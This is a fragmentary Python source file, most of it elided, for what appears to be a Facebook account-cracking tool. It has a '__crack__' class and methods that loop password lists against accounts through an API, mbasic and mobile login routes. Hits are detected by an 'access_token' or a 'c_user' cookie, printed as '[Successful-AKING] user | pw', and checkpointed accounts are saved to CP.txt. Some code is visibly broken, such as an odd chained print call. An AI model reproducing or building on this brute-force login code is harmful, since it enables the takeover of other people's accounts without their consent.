...
def hasil(ok,cp):
	...
	if len(ok) != 0 or len(cp) != 0:
		...
		#JAANI('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							JAANI('[•] Result CP saved to CP.txt')
					...
					JAANI('02.) Metode mbasic ')

					JAANI('03.) Metode Mobile ')
			...
			JAANI(' [1] AKING Method 1 ')

			JAANI(' [2] AKING Method 2  [ Pro ]')

			JAANI(' [3] AKING Method 3   ')
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				...
				JAANI('\r\033[1;92m[Successful-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					JAANI('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
				...
				JAANI('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      '%(user,pw,tahun(user)))
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				JAANI('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
				...
				try:
					...
					month = bulan_ttl[month].JAANI('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				JAANI('\r\033[1;92m[Successful-AKING] %s | %s      '%(user,pw))
